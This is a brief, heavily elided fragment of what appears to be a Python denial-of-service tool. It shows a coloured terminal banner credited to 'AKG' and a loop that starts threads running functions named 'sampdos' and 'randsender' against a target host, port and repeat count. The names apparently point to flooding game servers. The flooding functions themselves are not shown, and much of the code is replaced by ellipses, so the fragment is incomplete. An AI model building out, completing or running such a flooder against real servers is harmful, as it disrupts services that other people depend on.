...
\033[1;34m                [\033[34m<>\033[1;34m] \033[37mSent By     \033[1;34m:            [\033[34m<>\033[1;34m] \033[37mAKG
\033[1;35m              ╚════════════════════════════════════════════════╝
...
for y in range(threads):
        ...
        if choice == 'y':
                ...
                threading.Thread(target=sampdos,
                                 args=(host, port, times)).start()

                threading.Thread(target=randsender,
                                 args=(host, port, times)).start()
